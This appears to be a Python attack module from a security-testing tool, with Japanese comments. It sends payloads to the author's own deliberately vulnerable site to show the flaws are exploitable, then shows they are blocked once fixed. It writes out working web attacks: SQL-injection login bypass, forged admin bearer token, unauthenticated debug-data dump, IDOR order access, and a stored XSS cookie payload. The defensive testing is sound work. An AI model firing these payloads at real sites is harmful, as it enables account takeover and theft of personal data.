"""攻撃：やられ役サイトの各脆弱性に本物のHTTPペイロードを送って突破を試みる。

攻撃対象は allowlist で固定された自作サイトのみ（main.py で検査済み）。
各関数は「成功したか」と「証拠（抜けたデータ等）」を返す。修正適用後に同じ関数を
もう一度呼ぶと、今度は弾かれる（success=False）ことで防御を証明する。
"""
from __future__ import annotations

from dataclasses import dataclass

import httpx

from vulns import VulnId


@dataclass
class AttackResult:
    success: bool
    evidence: str
    payload: str


async def attack(client: httpx.AsyncClient, target: str, vuln: VulnId) -> AttackResult:
    if vuln == "sqli":
        return await _sqli(client, target)
    if vuln == "auth":
        return await _auth(client, target)
    if vuln == "misconfig":
        return await _misconfig(client, target)
    if vuln == "access":
        return await _access(client, target)
    if vuln == "xss":
        return await _xss(client, target)
    return AttackResult(False, "未知の脆弱性", "")


async def _sqli(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "username=admin' --  (パスワード無視)"
    try:
        res = await client.post(
            target + "/api/login",
            json={"username": "admin' --", "password": "wrong-password"},
            timeout=10,
        )
        if res.status_code == 200 and "token" in res.json():
            u = res.json().get("user", {})
            return AttackResult(
                True,
                f"パスワード無しで {u.get('username')}（{u.get('role')}）としてログイン成功",
                payload,
            )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "ログインは拒否された（プレースホルダで防御）", payload)


async def _auth(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "Authorization: Bearer user-1（管理者IDを推測して偽造）"
    try:
        res = await client.get(
            target + "/api/me",
            headers={"authorization": "Bearer user-1"},
            timeout=10,
        )
        if res.status_code == 200:
            u = res.json().get("user", {})
            if u.get("role") == "admin":
                return AttackResult(
                    True,
                    f"推測トークンで管理者 {u.get('username')} になりすまし成功",
                    payload,
                )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "偽造トークンは拒否された（署名検証で防御）", payload)


async def _misconfig(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "GET /api/debug（認証なし）"
    try:
        res = await client.get(target + "/api/debug", timeout=10)
        if res.status_code == 200:
            data = res.json()
            n = len(data.get("users", []))
            return AttackResult(
                True,
                f"内部設定と全ユーザー{n}件（パスワード・カード番号含む）が露出",
                payload,
            )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "デバッグ情報は非公開（403）", payload)


async def _access(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = "GET /api/orders/1002（他人の注文IDを直接指定・無認証）"
    try:
        res = await client.get(target + "/api/orders/1002", timeout=10)
        if res.status_code == 200:
            o = res.json().get("order", {})
            return AttackResult(
                True,
                f"他人の注文#{o.get('id')}（{o.get('address')} / ¥{o.get('total')}）を無認証で閲覧",
                payload,
            )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "他人の注文は拒否された（所有者チェックで防御）", payload)


async def _xss(client: httpx.AsyncClient, target: str) -> AttackResult:
    payload = '<script>alert(document.cookie)</script> をレビュー投稿'
    marker = "<script>alert(document.cookie)</script>"
    try:
        await client.post(
            target + "/api/products/1/reviews",
            json={"author": "antibody-agent", "body": marker},
            timeout=10,
        )
        res = await client.get(target + "/api/products/1/reviews", timeout=10)
        bodies = " ".join(r.get("body_html", "") for r in res.json().get("reviews", []))
        if marker in bodies:
            return AttackResult(
                True,
                "投稿した<script>が無加工で出力され、実行可能な状態",
                payload,
            )
    except Exception as e:  # noqa
        return AttackResult(False, f"例外: {e}", payload)
    return AttackResult(False, "スクリプトはエスケープされ無害化（出力エスケープで防御）", payload)
